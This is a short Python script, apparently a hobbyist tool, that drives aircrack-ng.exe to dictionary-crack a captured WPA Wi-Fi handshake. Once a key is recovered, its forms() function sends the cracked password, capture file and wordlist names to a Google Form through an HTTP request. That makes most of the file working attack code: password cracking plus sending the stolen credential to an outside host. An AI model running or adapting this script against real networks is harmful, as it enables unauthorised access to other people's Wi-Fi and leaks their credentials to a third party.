#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from requests import get
from urllib.parse import urlencode
import subprocess
from time import sleep
from os import getcwd, path, remove

token="$$$$$$$$$$$$$$$$"
entry="@@@@@@@@@@@@@"

"""
OPCIONAL SI SE COMPILA EN .exe
Si existe el archivo variables.txt continua, sino se cierra
en el archivo, la primera linea contendra el token
y la segunda contendra los numeros luego de entry.@@@ solo los numeros!!, las demas lineas las ignora.
lis=[]
try:
 with open("variables.txt","r") as f:
  for line in f.readlines():
   lis.append(line)
 token=lis[0].replace('\n','')
 entry=lis[1].replace('\n','')
except Exception as e:
 print("Error variables\n"+str(e))
 exit()
"""


def forms(key,pcap,dic):
 while True:
  try:
    data='####\nClave encontrada: '+str(key)+'\nCaptura: '+pcap+'\nDiccionario: '+dic+'\n\n## Coded by 4nth0nySLT ##\nTelegram: t.me/Anth0nySLT\nhttps://github.com/4nth0nySLT'
    url='https://docs.google.com/forms/u/0/d/e/'+str(token)+'/formResponse'
    label="entry."+str(entry)
    klog= {label: data}
    dataenc=urlencode(klog)
    req=get(url,dataenc)
    break
  except Exception as e:
      print("UPSS ocurrio un error\n"+str(e)+"\nReintentando...")
      sleep(15)
      pass

class AircrackPy():
    def __init__(self):
        print("""
##################################
# CODED BY 4nth0nySLT            #
# github.com/4nth0nySLT          #
# t.me/Anth0nySLT                #
#            ECUADOR             #
##################################
""")
        self.file = 'dsfsdcd'
        if path.exists(self.file):
            remove(self.file)
        self.command = str(getcwd())+"\\aircrack-ng.exe"

    def test(self):
        proc=subprocess.run([self.command,'-S'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return proc.stdout.decode()
    
    def wpa(self,dic,pcap):
        proc = subprocess.Popen([self.command,'-w',dic,pcap,'-l',self.file])
        
        while True:
           if path.exists('dsfsdcd'):
               with open('dsfsdcd','r') as f:
                   key=f.read()
                   print(key)
                   if key!='':
                       proc.kill()
                       forms(key,pcap,dic)
               sleep(2.5)
               remove(self.file)
               break
           elif proc.poll()!=None:
               break

